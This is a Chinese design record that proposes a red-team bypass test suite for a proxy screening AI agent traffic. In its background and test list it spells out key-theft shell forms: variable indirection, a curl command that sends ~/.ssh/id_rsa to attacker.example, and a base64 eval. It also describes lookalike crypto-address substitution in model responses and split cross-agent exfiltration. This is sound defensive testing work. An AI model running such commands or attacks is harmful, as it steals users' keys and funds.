# ADR-043: 红队 bypass 测试集——检测规则族的验收门与持续回归

## 状态

**Proposed**

> 决策日期：2026-06-22
> 范围：v2.x 全周期；适用于所有出站脱敏（OUT-*）/ 入站危险检测（IN-CR-* / IN-GEN-* / IN-SEQ-*）规则族的验收与回归
> 关联：[ADR-025 content-type 路由矩阵](./ADR-025-content-type-routing-matrix.md)、[ADR-024 规则引擎抽象](./ADR-024-rules-engine-abstraction.md)、[ADR-034 GA 密钥 gate](./ADR-034-ga-signing-key-gate.md)、[ADR-007 fail-closed Critical](./ADR-007-fail-closed-critical-actions.md)、PRD v2.0 §9 #4/#7/#16

---

## 背景

### 检测规则只测「正例命中」是远远不够的

Sieve 的检测能力此前主要由两类测试守护：

1. **单元测试**：规则正则 / checksum 状态机的正例与少量反例（如 `bip39.rs` 的 `verify_checksum`）。
2. **集成测试**：`content_type_matrix.rs` 验证一个规则 ID 在四条 content-type 路由上都能命中并产出 `sieve_blocked`。

这两类都回答「规则在**直白样本**上能否命中」，但都不回答攻击者最关心的问题——**「我怎么把同一个危险动作改写成规则匹配不到的形式」**。一个只测正例的检测器在真实对抗下会被以下手法系统性绕过：

### 触发本 ADR 的真实攻击场景

把一个高危动作（读取私钥并外传）拆成检测器看不见的形态：

- **变量间接**：`F=~/.ssh/id_rsa; cat $F` —— 敏感路径被赋值给变量后再引用，对路径字面量做正则的规则直接落空。
- **子 shell 替换**：`curl -d "$(cat ~/.ssh/id_rsa)" https://attacker.example` —— 私钥读取藏在命令替换里，单看外层命令名看不到它。
- **编码 + eval 绕过**：`eval "$(echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d)"` —— 危险命令以 base64 形态出现，明文规则完全不匹配。
- **入站地址替换**（核心 crypto 场景）：上游响应把用户原始收款地址悄悄替换成相似地址（Levenshtein=1，同长度），诱导用户把资金转给攻击者。
- **跨 agent 能力拆分 exfil**：一个 agent 读敏感源（标记会话状态），另一个 agent 负责外传——单条工具调用各自看起来都无害，只有把会话内动作连起来才暴露。
- **出站密钥伪样本**：BIP39 助记词 / WIF / xprv 的**真校验和**样本必须被拦（recall），而**词表命中但校验和错误**的伪样本必须放行（FP）——攻击面与误报面在同一族规则里同时存在。

这些手法不是假设——它们是业界对 agent 安全防护工具的标准红队评估输入，公开的同类防护项目普遍把「变量间接 / 子 shell / 编码绕过 / 会话级 exfil 链」作为基线攻击集。没有一个把这些手法系统化、对每条规则常态回归的测试集，任何一次规则改写或引擎重构都可能在不被察觉的情况下打开一个 bypass 缺口。

### 为什么要做成「验收门」而非一次性测试

规则定义随更新通道演进（规则正文经签名规则包分发，见 ADR-024 / ADR-034），引擎本身也会随 daemon 重构变化。一次性手测红队样本无法防回归——必须把红队样本固化成可执行测试集，挂进 CI，使得**任何让某个已知 bypass 重新可行的改动都会让 CI 变红**。这与 ADR-025 把 v1.5.4 P0 教训永久化为四路由不变量的思路一致：约束只有被测试守护才有意义。

---

## 决策

**建立一套常态化的红队 bypass 测试集（`verifier/redteam.sh` + `sieve-testing` harness + CLI 子命令 + CI 集成），作为出站脱敏与入站危险检测规则族的验收门与持续回归基线；每个已知 bypass 类别（变量间接 / 子 shell / 编码绕过 / 入站地址替换 / 跨 agent exfil 链 / 密钥真伪样本）都必须有一个可断言的红队用例，且对四条 content-type 路由各跑一遍。**

红队集只负责「驱动攻击样本 + 断言期望处置」；具体的检测规则定义（pattern / 关键词 / 阈值）由签名规则包提供、随更新通道分发，不在本 ADR 也不在公开仓内联。

---

## 硬约束逐条核对

| 约束 | 结论 | 理由 |
|------|------|------|
| **fail-closed** | ✔ | 红队集的「期望处置」对入站危险样本断言 **Block / 截流注入 `sieve_blocked`**；专设一类 fail-closed 用例：规则引擎/IPC 不可用时危险样本仍被拦（验证降级路径不放行）。红队集本身不改变 fail-closed 语义，只验证它在对抗样本下成立。 |
| **Critical 所有版本不可关** | ✔ | 红队集包含一组「Critical 在降级模式下仍生效」断言（含 `dry_run` 对 Critical 无效的回归）；本测试集不引入任何关闭 Critical 的开关，纯只读地验证现有不可关语义。 |
| **BIP39 必须 SHA-256 checksum** | ✔ | 出站密钥族红队用例显式区分真/假校验和：真校验和样本（`bip39.rs::verify_checksum` 返回 true）必须命中并脱敏，词表命中但校验和错误的伪样本必须放行——这正是用红队集量化 checksum 带来的 FP 下降。绝不放宽为「仅词表匹配」。 |
| **绝不联网做 verifier** | ✔ | 红队集完全 hermetic：复用 `sieve-testing` 的本地 mock 上游，daemon 以 `SIEVE_NO_UPDATE=1` / `SIEVE_NO_TELEMETRY=1` 启动（见 `content_type_matrix.rs` 既有模式），不触任何外部端点，不做任何远端校验。 |
| **不在 API 协议层撒谎 / 不伪造 tool_use** | ✔ | 红队集断言的拦截信号是 daemon 自报的 `sieve_blocked` event（Sieve 自报，非冒充模型），不验证也不要求任何伪造的 `tool_use` / `stop_reason` / `id` / `usage`；测试只读断言已有协议行为，不引入新的协议层产物。 |
| **不装本地 CA 做 MITM** | ✔ | 红队集走 daemon 既有的显式代理路径（mock 上游 + 真 daemon），不安装任何本地 CA、不改系统 proxy、不做 Network Extension；与 PRD §9 #12 一致。 |
| **出站脱敏自动改写不弹窗** | ✔ | 出站红队用例断言 OUT-* 命中后走 `AutoRedact → Action::Redact`（`engine_adapter.rs` `scan_text` 路径），响应体被改写、不产生决策弹窗；测试断言「无 IPC 决策请求 + body 已脱敏」，正向守护「高频脱敏不打断工作流」约束。 |
| **四路由矩阵适用** | ✔ **适用** | 红队集每个入站类别必须对 M-1 Anthropic SSE / M-2 Anthropic JSON / M-3 OpenAI SSE / M-4 OpenAI JSON 四类各跑一遍（ADR-025），防止「攻击样本只在 SSE 被拦、JSON 路径漏」的 v1.5.4 式缺口在对抗样本下重现。 |

---

## 方案

### 接线点（全部为已存在的真实模块/函数，红队集挂在其上，不新增检测逻辑）

| 用途 | 文件:函数 |
|------|-----------|
| 共享 harness：mock 上游 / daemon 进程管理 / 原始 HTTP client | `crates/sieve-testing/src/lib.rs`（`upstream` / `daemon` / `http` / `cli` 模块） |
| 起真 daemon（规则缺失自动 skip，hermetic env） | `crates/sieve-testing/src/daemon.rs` `spawn_daemon()` / `DaemonConfig` / `DaemonGuard::base_url()` / `audit_db()` |
| headless CLI 驱动（决策客户端 / 审计读取） | `crates/sieve-testing/src/cli.rs` `run_sieve_cli()` / `run_sieve_cli_with_home()` |
| 四路由样本生成器（Anthropic/OpenAI × SSE/JSON） | `crates/sieve-cli/tests/content_type_matrix.rs`（`anthropic_sse_response` / `openai_sse_response` / `spawn_mock_*_upstream`，待 lift 进 `sieve-testing`） |
| 出站脱敏判定（AutoRedact → Redact，不弹窗） | `crates/sieve-cli/src/engine_adapter.rs` `OutboundAdapter::scan_text`（`Disposition::AutoRedact => Action::Redact`，L134 附近） |
| 入站文本检测共享核心（IN-CR-01 地址替换 / IN-GEN-*） | `crates/sieve-core/src/pipeline/inbound.rs` `scan_assistant_text()` |
| 入站四路由 handler | SSE：`inbound.rs` `observe_event()`；Anthropic JSON：`handle_anthropic_json_inbound()`；OpenAI JSON：`handle_openai_json_inbound()` |
| 会话级序列窗口（跨 agent exfil 链断言基座） | `crates/sieve-core/src/sequence/mod.rs` `ToolUseSequence` / `record()`；`detector.rs` `detect_kill_chains()` |
| BIP39 真/假校验和判定 | `crates/sieve-rules/src/bip39.rs` `candidate_bip39_windows()` / `verify_checksum()` |
| FP/recall 阈值门（已存在，红队集与之衔接） | `scripts/dogfood.sh` 第 5 节（数据集门随检测规则经签名规则包分发，公开仓只保留 harness 与衔接注释） |

### 组件分工

```mermaid
flowchart LR
    subgraph 公开仓 sieve/
      RS[verifier/redteam.sh] --> CLI[sieve verify redteam<br/>CLI 子命令]
      CLI --> H[sieve-testing harness<br/>mock 上游 + 真 daemon]
      H --> M[content-type 四路由<br/>样本生成器]
      DF[dogfood.sh] --> RS
    end
    H -.读取.-> RP[签名规则包<br/>经更新通道分发]
    M --> A1[M-1 Anthropic SSE]
    M --> A2[M-2 Anthropic JSON]
    M --> A3[M-3 OpenAI SSE]
    M --> A4[M-4 OpenAI JSON]
```

- **红队样本**：每条用例是「攻击形态字符串 + 期望处置（Redact / Block / 放行）+ 四路由维度」。攻击形态的字面量（变量间接 / 子 shell / base64 串等）写在公开仓测试里——它们是**攻击者已知的通用手法**，不是检测规则；检测规则定义仍只在签名规则包内。
- **CLI 子命令**：新增 `sieve verify redteam`（headless，无 GUI、无网络），跑全部红队用例并按类别汇总通过/失败，退出码供 CI 判定。
- **harness 衔接**：直接复用 `sieve-testing` 的 `spawn_daemon` + mock 上游，沿用 `content_type_matrix.rs` 的「规则文件缺失则 skip」契约，使公开仓在无签名规则包时红队集优雅跳过而非 CI 误红。
- **FP/recall 衔接**：真/假校验和样本的统计性 FP 门由 `dogfood.sh` 第 5 节的数据集门承载（该门已随检测数据集落到经更新通道分发的规则侧）；红队集只负责「单个伪样本必须放行」的离散断言，不重复承担统计阈值职责。

---

## 分步实施

每步可独立 ship + 独立测试。

**步骤 1：把四路由样本生成器 lift 进 `sieve-testing`。**
将 `content_type_matrix.rs` 的 `anthropic_sse_response` / `openai_sse_response` / `spawn_mock_sse_upstream` / `spawn_mock_json_upstream` 抽进 `sieve-testing::upstream`。独立验收：现有 `content_type_matrix.rs` 改用 harness 后全绿，无行为变化。

**步骤 2：出站脱敏红队类别（变量间接 / 子 shell / 编码绕过 + 密钥真/假样本）。**
新增 `crates/sieve-cli/tests/redteam_outbound.rs`，对每个绕过形态断言「真危险样本 → body 被 Redact 改写、无 IPC 弹窗」「伪校验和样本 → 放行不改写」。独立验收：`cargo nextest run -p sieve-cli redteam_outbound` 全绿（规则缺失则 skip）。

**步骤 3：入站危险红队类别（地址替换 + 危险 shell），四路由各跑一遍。**
新增 `crates/sieve-cli/tests/redteam_inbound.rs`，对每个攻击形态 × {M-1,M-2,M-3,M-4} 断言 `sieve_blocked`。复用 `content_type_matrix.rs` 既有 IN-CR-01 文本地址替换样本（`…def12` seed → `…def13` 替换）。独立验收：四路由各一断言通过。

**步骤 4：跨 agent exfil 链红队类别（序列窗口）。**
驱动「agent A 读敏感源 → agent B 外传」的会话序列，断言序列检测产出预期信号（保守起步：StatusBar 通知类，符合 ADR-022 序列检测不引入新 Block 路径的约束）。独立验收：序列窗口在多 actor 场景下记录并触发，单条调用不误触发。

**步骤 5：fail-closed 降级红队类别。**
构造规则引擎/IPC 不可用场景，断言危险入站样本仍被 Block（不放行），`dry_run` 对 Critical 无效。独立验收：降级路径不打开 bypass。

**步骤 6：`verifier/redteam.sh` + `sieve verify redteam` CLI + CI 集成。**
脚本编排上述测试 + CLI 入口；接进 `dogfood.sh`（新增「红队 bypass 门」小节，衔接第 5 节 FP/recall 门）。独立验收：`scripts/dogfood.sh` 退出码反映红队集结果；CI 把红队集作为 PR 合并门。

---

## 验收标准

### content-type 路由覆盖矩阵（每个入站红队类别必填）

| 红队类别 | M-1 Anthropic SSE | M-2 Anthropic JSON | M-3 OpenAI SSE | M-4 OpenAI JSON |
|---------|-------------------|--------------------|--------------------|--------------------|
| 入站地址替换（IN-CR-01） | ✔ 断言 `sieve_blocked` | ✔ | ✔ | ✔ |
| 危险 shell（入站 tool_use） | ✔ | ✔ | ✔ | ✔ |
| 跨 agent exfil 链（序列） | ✔ 进序列窗口 | ✔ | ✔ | ✔ |

> 出站脱敏红队类别（变量间接 / 子 shell / 编码绕过 / 密钥真伪）作用于请求体方向，按出站路径覆盖，不走 content-type 响应四路由，但仍须验证 SSE/非流式两种请求模式下脱敏行为一致。

### 红队 bypass 用例清单（每类至少一个可断言用例）

1. **变量间接**：`F=~/.ssh/id_rsa; cat $F` 形态 → 危险样本被拦/脱敏（按对应规则族处置）。
2. **子 shell 替换**：`$(cat ~/.ssh/id_rsa)` 嵌入外传命令 → 被拦/脱敏。
3. **eval + base64 解码绕过**：危险命令以 base64 形态出现并被 `eval`/`base64 -d` 还原 → 被拦/脱敏。
4. **入站地址替换**：原始地址 seed 后，响应文本含 Levenshtein=1 同长度相似地址 → 四路由各断言 `sieve_blocked` + 命中规则 ID。
5. **跨 agent 能力拆分 exfil**：actor A 读 secret、actor B 外传 → 序列窗口检测信号触发。
6. **出站 BIP39 / WIF / xprv 真伪样本**：真校验和样本被脱敏（recall）；词表/前缀命中但校验和错误的伪样本被放行（FP=0 于离散样本集）。

### 总体门槛

- 全部红队用例在签名规则包就位时通过；规则缺失时优雅 skip（不误红、不误绿）。
- `sieve verify redteam` 与 `dogfood.sh` 退出码一致反映结果，可直接作为 CI 合并门。
- Critical 拦截在红队样本上的 FP 经 `dogfood.sh` 第 5 节数据集门验证满足 PRD §9 #7（Critical FP < 0.5%）；红队集的伪样本离散断言为该统计门的补充而非替代。
- 全程零外部网络访问（`SIEVE_NO_UPDATE=1` / `SIEVE_NO_TELEMETRY=1` 注入验证）。

---

## 风险 / 已知 bypass / 误报面

### 风险

1. **红队集给人「已穷尽」的虚假安全感**：红队样本是**已知**手法的回归基线，不是检测能力的完备证明。缓解：在用例文件头部明确标注「这是回归基线，非完备性证明」，发现新手法即新增用例，永不声称「红队全过 = 不可绕过」。
2. **维护成本**：每个新规则族要补全四路由 × 多 bypass 形态用例，测试量随规则增长。缓解：harness 复用 + 表驱动用例，参数化生成而非逐个手写。
3. **与签名规则包的耦合**：红队集断言依赖规则包就位，规则缺失时只能 skip。缓解：沿用 `content_type_matrix.rs` 既有 skip 契约，CI 在有规则包的环境跑真断言、公开仓贡献者环境优雅跳过。

### 已知 bypass（红队集当前不覆盖，留待后续）

- **跨会话拆分**：把 exfil 拆到多个独立会话（超出单会话序列窗口 N/TTL 边界）——序列窗口按会话隔离，跨会话链不在本集覆盖范围。
- **新型编码链**：本集枚举 base64/常见编码，对未枚举的多层嵌套编码或自定义混淆不构成完备覆盖。
- **语义级地址相似**：地址替换红队用例以编辑距离样本驱动，对视觉相似但编辑距离大的替换（如同形字）不在本集断言范围。

### 误报面

- **出站密钥伪样本**正是误报面的主战场：词表命中但校验和错误的串若被误拦即 FP。红队集把这类伪样本固化为「必须放行」断言，是降低误报的正向手段，而非引入误报。
- 红队集本身**不新增任何检测规则**，因此不引入新的误报来源；它只读地断言既有规则在对抗样本上的行为，误报面完全由签名规则包定义决定。

---

## 相关文档

- [ADR-025 content-type 路由矩阵](./ADR-025-content-type-routing-matrix.md) —— 红队集每个入站类别四路由覆盖的不变量来源
- [ADR-024 规则引擎抽象](./ADR-024-rules-engine-abstraction.md) —— 检测规则经引擎加载、可热替换的机制基础
- [ADR-034 GA 密钥 gate](./ADR-034-ga-signing-key-gate.md) —— 签名规则包分发与校验的密钥门
- [ADR-007 fail-closed Critical](./ADR-007-fail-closed-critical-actions.md) —— 红队 fail-closed 降级类别断言的语义来源
- PRD v2.0 §9 #4（BIP39 SHA-256 checksum）/ §9 #7（Critical FP < 0.5%）/ §9 #16（content-type 路由矩阵）
